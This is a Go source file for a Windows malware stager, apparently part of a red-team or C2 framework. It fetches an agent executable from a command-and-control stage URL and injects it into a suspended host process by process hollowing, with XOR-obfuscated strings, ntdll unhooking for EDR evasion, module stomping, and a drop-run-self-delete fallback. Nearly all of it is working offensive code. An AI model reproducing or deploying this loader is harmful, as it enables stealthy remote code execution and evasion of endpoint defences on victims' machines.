// Multi-stage stager: fetch agent PE from the C2 stage endpoint and run it in
// memory via process hollowing. No payload file ever touches disk.
//
// Config precedence: environment variables (see xor.go) > values baked at
// build time by scripts/bake_loader_secrets.go.
//
// Build (c-shared DLL used by WMI/MSI):
//   CC=x86_64-w64-mingw32-gcc CGO_ENABLED=1 GOOS=windows GOARCH=amd64 \
//     go build -buildmode=c-shared -o loader.dll .

package main

import (
	"bytes"
	"crypto/tls"
	"debug/pe"
	"encoding/binary"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

func defaultHostProc() string { return xob(eHostProc) }

var (
	modKernel32H              = syscall.NewLazyDLL(xob(eKernel32))
	modNtdllH                 = syscall.NewLazyDLL(xob(eNTDLLName))
	procCreateProcessWH       = modKernel32H.NewProc("CreateProcessW")
	procGetThreadContextH     = modKernel32H.NewProc("GetThreadContext")
	procSetThreadContextH     = modKernel32H.NewProc("SetThreadContext")
	procResumeThreadH         = modKernel32H.NewProc("ResumeThread")
	procVirtualAllocExH       = modKernel32H.NewProc("VirtualAllocEx")
	procWriteProcessMemoryH   = modKernel32H.NewProc("WriteProcessMemory")
	procCloseHandleH          = modKernel32H.NewProc("CloseHandle")
	procCreateRemoteThreadH   = modKernel32H.NewProc("CreateRemoteThread")
	procVirtualProtectExH     = modKernel32H.NewProc("VirtualProtectEx")
	procLoadLibraryWH         = modKernel32H.NewProc("LoadLibraryW")
	procGetProcAddressH       = modKernel32H.NewProc("GetProcAddress")
	procGetModuleHandleWH     = modKernel32H.NewProc("GetModuleHandleW")
	procNtUnmapViewOfSectionH = modNtdllH.NewProc("NtUnmapViewOfSection")
	procWaitForSingleObjectH  = modKernel32H.NewProc("WaitForSingleObject")
	procCreateFileWH          = modKernel32H.NewProc("CreateFileW")
)

const (
	CREATE_SUSPENDED        = 0x00000004
	INFINITE                = 0xFFFFFFFF
	CONTEXT_AMD64           = 0x00100000
	CONTEXT_FULL            = CONTEXT_AMD64 | 0x10007
	MEM_COMMIT              = 0x1000
	MEM_RESERVE             = 0x2000
	PAGE_EXECUTE_READWRITE  = 0x40
	IMAGE_REL_BASED_HIGHLOW = 3
	IMAGE_REL_BASED_DIR64   = 10
)

type processInformation struct {
	ProcessHandle uintptr
	ThreadHandle  uintptr
	ProcessID     uint32
	ThreadID      uint32
}

type startupInfo struct {
	cb              uint32
	lpReserved      *uint16
	lpDesktop       *uint16
	lpTitle         *uint16
	dwX             uint32
	dwY             uint32
	dwXSize         uint32
	dwYSize         uint32
	dwXCountChars   uint32
	dwYCountChars   uint32
	dwFillAttribute uint32
	dwFlags         uint32
	wShowWindow     uint16
	cbReserved2     uint16
	lpReserved2     *byte
	hStdInput       uintptr
	hStdOutput      uintptr
	hStdErr         uintptr
}

type contextAMD64 struct {
	P1Home       uint64
	P2Home       uint64
	P3Home       uint64
	P4Home       uint64
	P5Home       uint64
	P6Home       uint64
	ContextFlags uint32
	MxCsr        uint32
	SegCs        uint16
	SegDs        uint16
	SegEs        uint16
	SegFs        uint16
	SegGs        uint16
	SegSs        uint16
	EFlags       uint32
	Dr0          uint64
	Dr1          uint64
	Dr2          uint64
	Dr3          uint64
	Dr6          uint64
	Dr7          uint64
	Rax          uint64
	Rcx          uint64
	Rdx          uint64
	Rbx          uint64
	Rsp          uint64
	Rbp          uint64
	Rsi          uint64
	Rdi          uint64
	R8           uint64
	R9           uint64
	R10          uint64
	R11          uint64
	R12          uint64
	R13          uint64
	R14          uint64
	R15          uint64
	Rip          uint64
}

func stageURL() string {
	if v := os.Getenv(xob(eEnvStageURL)); v != "" {
		return v
	}
	return bakedStageURL()
}

func stageAuthToken() string {
	if v := os.Getenv(xob(eEnvStageToken)); v != "" {
		return v
	}
	return bakedStageToken()
}

func stageInsecure() bool {
	if v := os.Getenv(xob(eEnvStageInsecure)); v != "" {
		return v != "0" && strings.ToLower(v) != "false"
	}
	p := bakedStageInsecure()
	if p == "" {
		return true // lab self-signed cert by default
	}
	return p == "1" || strings.EqualFold(p, "true")
}

func hostProc() string {
	if v := os.Getenv(xob(eEnvTargetHost)); v != "" {
		return v
	}
	if p := bakedTargetHost(); p != "" {
		return p
	}
	return defaultHostProc()
}

// stageFetch downloads the raw PE payload from the C2 stage endpoint.
func stageFetch(url string, insecure bool) ([]byte, error) {
	if url == "" {
		return nil, fmt.Errorf("empty stage url")
	}
	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: insecure}}
	client := &http.Client{Transport: tr, Timeout: 30 * time.Second}
	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set(xob(eHdUA), xob(eUA))
	req.Header.Set(xob(eHdAccept), xob(eHdAny))
	if tok := stageAuthToken(); tok != "" {
		req.Header.Set(xob(eHdAuth), tok)
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("stage http %d", resp.StatusCode)
	}
	body, err := io.ReadAll(io.LimitReader(resp.Body, 16<<20))
	if err != nil {
		return nil, err
	}
	if len(body) < 2 || body[0] != 'M' || body[1] != 'Z' {
		return nil, fmt.Errorf("stage payload not a PE (len=%d)", len(body))
	}
	return body, nil
}

// -------- process hollowing --------

func createSuspendedProcess(imagePath string) (*processInformation, error) {
	imagePathPtr, err := syscall.UTF16PtrFromString(imagePath)
	if err != nil {
		return nil, err
	}
	// Redirect the guest's stderr/stdout to a log file so Go runtime fatal
	// errors (which print to stderr before ExitProcess) are not lost.
	logPath, _ := syscall.UTF16PtrFromString(xob(eLabLog))
	si := &startupInfo{
		cb:         uint32(unsafe.Sizeof(startupInfo{})),
		dwFlags:    0x100, // STARTF_USESTDHANDLES
		hStdInput:  ^uintptr(0),
		hStdOutput: ^uintptr(0),
		hStdErr:    ^uintptr(0),
	}
	sa := &securityAttributes{nLength: uint32(unsafe.Sizeof(securityAttributes{})), bInheritHandle: 1}
	hFile, _, e := procCreateFileWH.Call(
		uintptr(unsafe.Pointer(logPath)), 0xC0000000, 1|2, uintptr(unsafe.Pointer(sa)), 4, 0x80, 0,
	)
	if hFile != 0 && hFile != ^uintptr(0) {
		si.hStdOutput = hFile
		si.hStdErr = hFile
	}
	pi := &processInformation{}
	r, _, e := procCreateProcessWH.Call(
		0, uintptr(unsafe.Pointer(imagePathPtr)),
		0, 0, 1, CREATE_SUSPENDED,
		0, 0,
		uintptr(unsafe.Pointer(si)),
		uintptr(unsafe.Pointer(pi)),
	)
	if r == 0 {
		if hFile != 0 && hFile != ^uintptr(0) {
			procCloseHandleH.Call(hFile)
		}
		return nil, fmt.Errorf("CreateProcessW(%s): %v", imagePath, e)
	}
	if hFile != 0 && hFile != ^uintptr(0) {
		procCloseHandleH.Call(hFile)
	}
	return pi, nil
}

type securityAttributes struct {
	nLength              uint32
	lpSecurityDescriptor uintptr
	bInheritHandle       uint32
}

func writeRemote(h, dst uintptr, data []byte) error {
	var written uintptr
	r, _, e := procWriteProcessMemoryH.Call(h, dst, uintptr(unsafe.Pointer(&data[0])), uintptr(len(data)), uintptr(unsafe.Pointer(&written)))
	if r == 0 {
		return fmt.Errorf("WriteProcessMemory: %v", e)
	}
	return nil
}

func readRemote(h, addr uintptr, buf unsafe.Pointer, n int) error {
	r, _, e := procReadProcessMemoryH.Call(h, addr, uintptr(buf), uintptr(n), 0)
	if r == 0 {
		return fmt.Errorf("ReadProcessMemory: %v", e)
	}
	return nil
}

var procReadProcessMemoryH = modKernel32H.NewProc("ReadProcessMemory")

// hollow maps r.Image into the suspended remote process and returns the entry point.
func (r *ReflectiveLoader) hollow(pi *processInformation) (uintptr, error) {
	f, err := pe.NewFile(bytes.NewReader(r.Image))
	if err != nil {
		return 0, fmt.Errorf("parse PE: %w", err)
	}
	defer f.Close()
	oh, ok := f.OptionalHeader.(*pe.OptionalHeader64)
	if !ok {
		return 0, fmt.Errorf("only PE32+ (x64) supported")
	}
	preferredBase := oh.ImageBase
	size := uint32(oh.SizeOfImage)
	if size == 0 {
		size = r.calculateImageSize(f)
	}
	procNtUnmapViewOfSectionH.Call(pi.ProcessHandle, uintptr(preferredBase))

	allocAddr, _, e := procVirtualAllocExH.Call(pi.ProcessHandle, uintptr(preferredBase), uintptr(size), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if allocAddr == 0 {
		return 0, fmt.Errorf("VirtualAllocEx: %v", e)
	}
	base := uintptr(allocAddr)

	hdrSize := int(oh.SizeOfHeaders)
	if hdrSize > len(r.Image) {
		hdrSize = len(r.Image)
	}
	if err := writeRemote(pi.ProcessHandle, base, r.Image[:hdrSize]); err != nil {
		return 0, err
	}
	for _, s := range f.Sections {
		data, err := s.Data()
		if err != nil || len(data) == 0 {
			continue
		}
		if err := writeRemote(pi.ProcessHandle, base+uintptr(s.VirtualAddress), data); err != nil {
			return 0, err
		}
	}

	delta := uint64(base) - preferredBase
	if delta != 0 {
		if err := applyRelocationsRemote(pi.ProcessHandle, base, f, r.Image, delta); err != nil {
			return 0, err
		}
	}
	if err := r.fixImportsRemote(pi.ProcessHandle, base, f); err != nil {
		return 0, err
	}
	return uintptr(uint64(base) + uint64(oh.AddressOfEntryPoint)), nil
}

// rvaToFileOffset maps an RVA inside r.Image to its raw file offset using the
// section table. RVAs are NOT file offsets for most Go/PE32+ binaries.
func rvaToFileOffset(f *pe.File, rva uint32) (int, bool) {
	for _, s := range f.Sections {
		va := uint32(s.VirtualAddress)
		if rva >= va && rva < va+s.VirtualSize {
			rel := int(rva - va)
			if rel > int(s.Size) {
				return 0, false
			}
			return int(s.Offset) + rel, true
		}
	}
	return 0, false
}

// applyRelocationsRemote fixes .reloc entries in the target for delta = base - ImageBase.
func applyRelocationsRemote(h, base uintptr, f *pe.File, img []byte, delta uint64) error {
	oh, ok := f.OptionalHeader.(*pe.OptionalHeader64)
	if !ok {
		return fmt.Errorf("not PE32+")
	}
	dd := oh.DataDirectory
	if len(dd) <= 5 {
		return nil
	}
	relocDir := dd[5]
	if relocDir.VirtualAddress == 0 || relocDir.Size == 0 {
		return nil
	}
	// slice .reloc out of r.Image using RVA->file offset
	relocOff, ok := rvaToFileOffset(f, relocDir.VirtualAddress)
	if !ok {
		return nil
	}
	n := int(relocDir.Size)
	if relocOff+n > len(img) {
		n = len(img) - relocOff
	}
	if n <= 0 {
		return nil
	}
	relocData := img[relocOff : relocOff+n]
	pos := 0
	for pos+8 <= len(relocData) {
		pageRVA := binary.LittleEndian.Uint32(relocData[pos : pos+4])
		count := int(binary.LittleEndian.Uint32(relocData[pos+4 : pos+8]))
		pos += 8
		end := pos + count
		if end > len(relocData) {
			end = len(relocData)
		}
		for i := pos; i+2 <= end; i += 2 {
			ent := binary.LittleEndian.Uint16(relocData[i : i+2])
			typ := int(ent >> 12)
			off := uintptr(ent & 0x0FFF)
			switch typ {
			case IMAGE_REL_BASED_HIGHLOW:
				addr := base + uintptr(pageRVA) + off
				var val uint32
				if err := readRemote(h, addr, unsafe.Pointer(&val), 4); err != nil {
					continue
				}
				val += uint32(delta)
				b := make([]byte, 4)
				binary.LittleEndian.PutUint32(b, val)
				_ = writeRemote(h, addr, b)
			case IMAGE_REL_BASED_DIR64:
				addr := base + uintptr(pageRVA) + off
				var val uint64
				if err := readRemote(h, addr, unsafe.Pointer(&val), 8); err != nil {
					continue
				}
				val += delta
				b := make([]byte, 8)
				binary.LittleEndian.PutUint64(b, val)
				_ = writeRemote(h, addr, b)
			}
		}
		pos = end
	}
	return nil
}

// fixImportsRemote resolves the IAT in the target. Loader and target share
// system DLL base addresses, so GetProcAddress in this process is valid there.
func (r *ReflectiveLoader) fixImportsRemote(h, base uintptr, f *pe.File) error {
	oh, ok := f.OptionalHeader.(*pe.OptionalHeader64)
	if !ok {
		return fmt.Errorf("not PE32+")
	}
	dd := oh.DataDirectory
	if len(dd) <= 1 {
		return nil
	}
	impDir := dd[1]
	if impDir.VirtualAddress == 0 || impDir.Size == 0 {
		return nil
	}
	img := r.Image
	// iterate import descriptors (20 bytes each) directly from r.Image
	headOff, ok := rvaToFileOffset(f, impDir.VirtualAddress)
	if !ok {
		return nil
	}
	for i := 0; ; i++ {
		off := headOff + i*20
		if off+20 > len(img) {
			break
		}
		ent := img[off : off+20]
		nameRVA := binary.LittleEndian.Uint32(ent[12:16])
		origThunkRVA := binary.LittleEndian.Uint32(ent[0:4])
		firstThunkRVA := binary.LittleEndian.Uint32(ent[16:20])
		if nameRVA == 0 {
			break
		}
		nameOff, ok := rvaToFileOffset(f, nameRVA)
		if !ok {
			break
		}
		dllName := imageCString(img, nameOff)
		if dllName == "" {
			break
		}
		loadRemoteDLL(h, dllName)
		modHandle := loadLocalDLL(dllName)
		thunkRVA := firstThunkRVA
		if thunkRVA == 0 {
			thunkRVA = origThunkRVA
		}
		thunkBaseOff, ok := rvaToFileOffset(f, thunkRVA)
		if !ok {
			continue
		}
		for j := 0; ; j++ {
			thunkOff := thunkBaseOff + j*8
			if thunkOff+8 > len(img) {
				break
			}
			thunk := binary.LittleEndian.Uint64(img[thunkOff : thunkOff+8])
			if thunk == 0 {
				break
			}
			var fnAddr uint64
			if thunk&0x8000000000000000 != 0 {
				fnAddr = resolveName(modHandle, fmt.Sprintf("#%d", thunk&0xFFFF))
			} else {
				nOff, ok := rvaToFileOffset(f, uint32(thunk)+2)
				if !ok {
					continue
				}
				iatName := imageCString(img, nOff)
				fnAddr = resolveName(modHandle, iatName)
			}
			if fnAddr != 0 {
				b := make([]byte, 8)
				binary.LittleEndian.PutUint64(b, fnAddr)
				_ = writeRemote(h, base+uintptr(thunkRVA)+uintptr(j*8), b)
			}
		}
	}
	return nil
}

func imageCString(img []byte, off int) string {
	if off < 0 || off >= len(img) {
		return ""
	}
	end := off
	for end < len(img) && img[end] != 0 {
		end++
	}
	if end >= len(img) {
		return ""
	}
	return string(img[off:end])
}

func loadRemoteDLL(h uintptr, dllName string) {
	ptr, err := syscall.UTF16PtrFromString(dllName)
	if err != nil {
		return
	}
	th, _, e := procCreateRemoteThreadH.Call(h, 0, 0, procLoadLibraryWH.Addr(), uintptr(unsafe.Pointer(ptr)), 0, 0)
	if th == 0 {
		_ = e
		return
	}
	procWaitForSingleObjectH.Call(th, INFINITE)
	procCloseHandleH.Call(th)
}

func loadLocalDLL(dllName string) uintptr {
	ptr, err := syscall.UTF16PtrFromString(dllName)
	if err != nil {
		return 0
	}
	if h, _, _ := procGetModuleHandleWH.Call(uintptr(unsafe.Pointer(ptr))); h != 0 {
		return h
	}
	r, _, _ := procLoadLibraryWH.Call(uintptr(unsafe.Pointer(ptr)))
	return r
}

func resolveName(mod uintptr, name string) uint64 {
	if strings.HasPrefix(name, "#") {
		var ord uintptr
		_, _ = fmt.Sscanf(name[1:], "%d", &ord)
		r, _, _ := procGetProcAddressH.Call(mod, ord)
		return uint64(r)
	}
	cname, err := syscall.BytePtrFromString(name)
	if err != nil {
		return 0
	}
	r, _, _ := procGetProcAddressH.Call(mod, uintptr(unsafe.Pointer(cname)))
	return uint64(r)
}

// hollowRun executes payload in a fresh suspended host process.
func hollowRun(payload []byte) error {
	host := hostProc()
	pi, err := createSuspendedProcess(host)
	if err != nil {
		return err
	}
	defer procCloseHandleH.Call(pi.ProcessHandle)
	defer procCloseHandleH.Call(pi.ThreadHandle)

	l := NewReflectiveLoader(payload)
	entry, err := l.hollow(pi)
	if err != nil {
		return err
	}
	ctx := &contextAMD64{ContextFlags: CONTEXT_FULL}
	if rr, _, e := procGetThreadContextH.Call(pi.ThreadHandle, uintptr(unsafe.Pointer(ctx))); rr == 0 {
		return fmt.Errorf("GetThreadContext: %v", e)
	}
	ctx.Rip = uint64(entry)
	if rr, _, e := procSetThreadContextH.Call(pi.ThreadHandle, uintptr(unsafe.Pointer(ctx))); rr == 0 {
		return fmt.Errorf("SetThreadContext: %v", e)
	}
	if rr, _, e := procResumeThreadH.Call(pi.ThreadHandle); rr == 0xFFFFFFFF {
		return fmt.Errorf("ResumeThread: %v", e)
	}
	fmt.Fprintf(os.Stderr, xob(eDiagHollowOK), host, pi.ProcessID, entry)
	return nil
}

// runStage is the preferred entry path when C2_STAGE_URL is configured.
func runStage() error {
	url := stageURL()
	if url == "" {
		return fmt.Errorf("no stage url")
	}
	fmt.Fprintf(os.Stderr, xob(eDiagFetch), url)
	payload, err := stageFetch(url, stageInsecure())
	if err != nil {
		return err
	}
	// Best-effort evasion init (hash resolution + ntdll unhook + syscall numbers).
	if err := InitEvasion(); err != nil {
		fmt.Fprintf(os.Stderr, xob(eDiagEvasionInit), err)
	} else {
		fmt.Fprintf(os.Stderr, xob(eDiagEvasionReady), ev.Ready)
	}
	switch stageMode() {
	case "stomp":
		// Module stomping / hollowing (Go-hostile; kept for EDR A/B only).
		return stompRun(payload)
	case "file", "":
		// Staged V2 default: drop → run → self-delete. No Go+hollow crash.
		return dropRunDelete(payload)
	default:
		return dropRunDelete(payload)
	}
}
